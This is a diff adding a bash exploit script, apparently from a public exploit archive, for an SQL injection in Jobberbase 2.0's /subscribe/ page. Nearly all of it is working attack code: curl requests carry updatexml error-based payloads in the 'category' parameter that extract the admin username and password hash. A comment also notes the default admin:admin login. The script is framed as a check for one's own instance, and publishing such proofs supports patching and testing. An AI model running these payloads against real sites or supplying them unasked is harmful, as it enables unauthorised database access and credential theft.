@@ -1,0 +1,41 @@
+#!/bin/bash
+# Exploit Title: Jobberbase 2.0 - 'subscribe' SQL injection
+# Date: 29 August 2019
+# Exploit Author: Damian Ebelties (https://zerodays.lol/)
+# Vendor Homepage: http://www.jobberbase.com/
+# Version: 2.0
+# Tested on: Ubuntu 18.04.1
+
+: '
+
+    The page "/subscribe/" is vulnerable for SQL injection.
+
+    Simply make a POST request to /subscribe/ with the parameters:
+     - email=jobber@zerodays.lol
+     - category=1337<inject_here>
+
+    You can use this script to verify if YOUR OWN instance is vulnerable.
+
+    $ bash verify.sh http://localhost/jobberbase/
+    admin:1a1dc91c907325c69271ddf0c944bc72
+
+'
+
+: 'Fetch the username'
+USERNAME=$(curl -s "$1/subscribe/" \
+                -d "email=jobber@zerodays.lol" \
+                -d "category=-1337 and updatexml(0,concat(0x0a,(select username from admin limit 0,1),0x0a),0)-- -" \
+                -d "zero=days.lol" | head -n 3 | tail -n 1 | sed "s/'' in.*//")
+
+: 'Ugly way to fetch the password hash'
+PASS=$(curl -s "$1/subscribe/" \
+            -d "email=jobber@zerodays.lol" \
+            -d "category=-1337 and updatexml(0,concat(0x0a,(select substring(password,1,16) from admin limit 0,1),0x0a),0)-- -" \
+            -d "zero=days.lol" | head -n 3 | tail -n 1 | sed "s/'' in.*//")
+WORD=$(curl -s "$1/subscribe/" \
+            -d "email=jobber@zerodays.lol" \
+            -d "category=-1337 and updatexml(0,concat(0x0a,(select substring(password,17,16) from admin limit 0,1),0x0a),0)-- -" \
+            -d "zero=days.lol" | head -n 3 | tail -n 1 | sed "s/'' in.*//")
+
+: 'Print the user:hash (note: default login is admin:admin)'
+echo -e "$USERNAME:$PASS$WORD"
